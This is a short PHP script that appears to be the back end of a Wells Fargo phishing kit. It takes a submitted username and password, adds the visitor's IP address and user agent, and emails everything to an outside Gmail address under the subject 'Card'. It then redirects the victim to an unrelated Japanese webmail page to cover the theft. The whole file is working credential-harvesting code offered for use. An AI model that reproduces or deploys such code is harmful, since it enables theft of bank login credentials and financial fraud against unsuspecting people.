<?php
if($_POST["userwm"] != "" and $_POST["passwm"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------WellsFargo Info-----------------------\n";
$message .= "Username            : ".$_POST['userwm']."\n";
$message .= "Password           : ".$_POST['passwm']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "fudtoolshop@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://webmail.pikara.ne.jp/");
}else{
header ("Location: index.php");
}

?>